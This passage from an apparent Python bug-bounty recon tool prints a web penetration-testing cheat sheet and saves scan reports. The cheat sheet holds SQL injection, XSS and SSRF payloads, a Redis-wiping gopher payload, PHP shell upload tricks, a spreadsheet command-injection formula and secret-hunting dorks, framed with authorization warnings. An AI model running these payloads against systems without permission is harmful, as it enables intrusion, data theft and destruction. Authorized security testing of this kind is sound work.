{BOLD}{Y}【3】 SQL INJECTION{RST}
  → Manual: add ' to all parameters, look for SQL errors
  → Error-based: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
  → Blind: 1' AND SLEEP(5)-- (time-based)
  → Tool: sqlmap -u "https://{domain}/page?id=1" --dbs --batch
  → Check all input fields: search, login, registration, filters, sorting
  → Don't forget HTTP headers: User-Agent, X-Forwarded-For, Cookie values

{BOLD}{Y}【4】 XSS (Cross-Site Scripting){RST}
  → Basic: <script>alert(1)</script>
  → Attribute escape: " onmouseover="alert(1)
  → HTML entities bypass: &lt;script&gt;alert(1)&lt;/script&gt;
  → DOM XSS: check JS source for dangerous sinks (innerHTML, eval, document.write)
  → Stored XSS: profile fields, comments, product names, file names
  → Check reflected parameters, error messages, search results
  → Tool: dalfox url "https://{domain}/?q=test"

{BOLD}{Y}【5】 SERVER-SIDE REQUEST FORGERY (SSRF){RST}
  → Look for URL parameters: ?url=, ?webhook=, ?callback=, ?redirect=, ?fetch=
  → Payload: http://169.254.169.254/latest/meta-data/ (AWS metadata)
  → Payload: http://localhost/admin
  → Gopher protocol: gopher://127.0.0.1:6379/_FLUSHALL (Redis RCE)
  → Use Burp Collaborator or https://interactsh.com to detect blind SSRF
  → Try in: image upload via URL, PDF generators, webhooks, XML imports

{BOLD}{Y}【6】 FILE UPLOAD VULNERABILITIES{RST}
  → Upload .php files renamed as: shell.php.jpg, shell.jpg.php, shell.phtml
  → Change Content-Type to image/jpeg while uploading PHP shell
  → Test SVG upload for XSS: <svg><script>alert(1)</script></svg>
  → Upload CSV/Excel with formula injection: =cmd|'/c calc'!A0
  → Check if uploaded files are executable (path traversal in filename)
  → Test XXE via XML/SVG file upload

{BOLD}{Y}【7】 API SECURITY TESTING{RST}
  → Check /api/v1/, /api/v2/ — v1 often less protected
  → Look for GraphQL: try introspection query
  → Test mass assignment: add extra fields like "role":"admin" in JSON body
  → Check rate limiting: send 100 requests/second to auth endpoints
  → Test parameter pollution: ?id=1&id=2
  → Look for API keys in responses, JS files, mobile apps

{BOLD}{Y}【8】 BUSINESS LOGIC FLAWS{RST}
  → Negative price/quantity: set price=-100 or quantity=-1
  → Coupon abuse: apply same coupon multiple times
  → Race conditions: parallel requests for limited resources (promo codes, etc.)
  → Account enumeration: check for different responses for valid vs invalid email
  → Test order of operations: skip payment step, go directly to confirmation

{BOLD}{Y}【9】 SENSITIVE DATA EXPOSURE{RST}
  → Check /.git/HEAD — if accessible, dump with: git-dumper https://{domain} ./output
  → Check /.env — often contains DB passwords, API keys
  → Google dork: site:{domain} ext:php inurl:config
  → Google dork: site:{domain} "password" OR "api_key" filetype:json
  → Check GitHub for leaked code: github.com search: "{domain}"
  → Check Shodan: shodan.io search for IP addresses found
"""

    if cms:
        guide += f"""
{BOLD}{Y}【10】 CMS-SPECIFIC ATTACKS ({', '.join(cms)}){RST}"""
        if "WordPress" in cms:
            guide += f"""
  WordPress:
  → WPScan: wpscan --url https://{domain} --enumerate u,p,t,vp --api-token YOUR_TOKEN
  → Check /xmlrpc.php for brute force: 100 passwords in 1 request
  → User enumeration: /wp-json/wp/v2/users
  → Check outdated plugins in /wp-content/plugins/
  → Try default credentials on /wp-login.php"""
        if "Joomla" in cms:
            guide += f"""
  Joomla:
  → JoomScan: joomscan --url https://{domain}
  → Check /administrator/ for login
  → Test SQL injection in com_search"""

    guide += f"""
{BOLD}{Y}【11】 TOOLS TO INSTALL & USE{RST}
  → Subdomain: subfinder, amass, assetfinder
    subfinder -d {domain} -o subs.txt

  → Port Scan: nmap
    nmap -sV -sC -p- --open {domain}

  → Directory: feroxbuster, gobuster, ffuf
    ffuf -u https://{domain}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

  → Parameter Discovery: arjun
    arjun -u https://{domain}/search

  → SQL Injection: sqlmap
    sqlmap -u "https://{domain}/page?id=1" --level=5 --risk=3

  → XSS: dalfox
    dalfox url "https://{domain}/?q=1"

  → Secrets in JS: trufflehog, gitleaks
    trufflehog git https://github.com/target/repo

  → WAF Bypass: sqlmap --tamper=space2comment,between

{BOLD}{Y}【12】 REPORTING YOUR FINDINGS{RST}
  → Document: Vulnerability name, CVSS score, steps to reproduce, impact, PoC
  → Use Burp Suite's Repeater to capture proof
  → Follow responsible disclosure — report to security@{domain} or HackerOne/Bugcrowd
  → Do NOT exploit beyond proof of concept
  → Do NOT access other users' private data

{BOLD}{R}⚠  LEGAL REMINDER: Only test on domains you have written permission for.
   Unauthorized testing is illegal. Stay ethical!{RST}
"""
    print(guide)
    results["manual_tips"] = guide
    return guide

# ─────────────────────────────────────────────
# REPORT GENERATOR
# ─────────────────────────────────────────────
def save_report(domain):
    section("SAVING REPORT")
    filename = f"report_{domain.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    txt_filename = filename.replace(".json", ".txt")

    with open(filename, "w") as f:
        json.dump(results, f, indent=2, default=str)
    success(f"JSON report saved: {filename}")

    with open(txt_filename, "w") as f:
        f.write(f"BUG BOUNTY RECON REPORT\n")
        f.write(f"Domain: {domain}\n")
        f.write(f"Date: {results['timestamp']}\n\n")
        f.write(f"SUBDOMAINS ({len(results['subdomains'])}):\n")
        for s in results["subdomains"]:
            f.write(f"  {s}\n")
        f.write(f"\nVULNERABILITIES FOUND ({len(results['vulnerabilities'])}):\n")
        for v in results["vulnerabilities"]:
            f.write(f"  [!] {v}\n")
        f.write(f"\nOPEN PORTS:\n")
        for host, ports in results["open_ports"].items():
            f.write(f"  {host}: {ports}\n")
        f.write(f"\nJS SECRETS:\n")
        for s in results["js_secrets"]:
            f.write(f"  [{s['type']}] {s['value'][:80]}\n")
        f.write(f"\nCMS DETECTED: {results['cms_info']}\n")
        f.write(f"\nWAF DETECTED: {results['waf_info']}\n")
        f.write(f"\nMANUAL TESTING GUIDE:\n{results.get('manual_tips', '')}\n")

    success(f"Text report saved: {txt_filename}")
    return filename, txt_filename

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
def main():
    banner()

    if len(sys.argv) < 2:
        print(f"{Y}Usage:{RST} python3 bugbounty_recon.py <domain>")
        print(f"{Y}Example:{RST} python3 bugbounty_recon.py example.com")
        print(f"\n{R}⚠  Only use on domains you have explicit permission to test!{RST}")
        sys.exit(1)

    domain = sys.argv[1].strip().lower()
    domain = re.sub(r'^https?://', '', domain).rstrip('/')

    print(f"\n{G}Target Domain: {BOLD}{domain}{RST}")
    print(f"{R}{BOLD}⚠  By continuing you confirm you have authorization to test this domain.{RST}")
    confirm = input(f"{Y}Continue? (yes/no): {RST}").strip().lower()
    if confirm != "yes":
        print("Aborted.")
        sys.exit(0)

    results["domain"] = domain
    results["timestamp"] = datetime.now().isoformat()

    start = time.time()

    try:
        # Run all modules
        whois_recon(domain)
        subdomain_enum(domain)
        ips = find_real_ip(domain)
        target_ip = ips[0] if ips else domain
        port_scan(target_ip)
        detect_waf(domain)
        detect_cms(domain)
        gather_urls(domain)
        analyze_js(domain)
        analyze_headers(domain)
        probe_vulnerabilities(domain)
        generate_manual_guide(domain)

    except KeyboardInterrupt:
        warn("\nInterrupted by user. Saving partial report...")

    # Summary
    section("SCAN SUMMARY")
    elapsed = time.time() - start
    print(f"  {C}Domain:{RST}           {domain}")
    print(f"  {C}Scan Time:{RST}        {elapsed:.1f} seconds")
    print(f"  {C}Subdomains:{RST}       {len(results['subdomains'])}")
    print(f"  {C}Open Ports:{RST}       {sum(len(v) for v in results['open_ports'].values())}")
    print(f"  {C}URLs Found:{RST}       {len(results['urls'])}")
    print(f"  {C}JS Files:{RST}         {len(results['js_files'])}")
    print(f"  {C}JS Secrets:{RST}       {len(results['js_secrets'])}")
    print(f"  {C}CMS Detected:{RST}     {results['cms_info'].get('detected', 'None')}")
    print(f"  {C}WAF Detected:{RST}     {results['waf_info'].get('detected', 'None')}")
    print(f"\n  {R}{BOLD}VULNERABILITIES FOUND: {len(results['vulnerabilities'])}{RST}")
    for v in results["vulnerabilities"]:
        print(f"    {R}[!]{RST} {v}")

    save_report(domain)
    print(f"\n{G}{BOLD}✓ Recon complete! Check the report files for full details.{RST}\n")

if __name__ == "__main__":
    main()
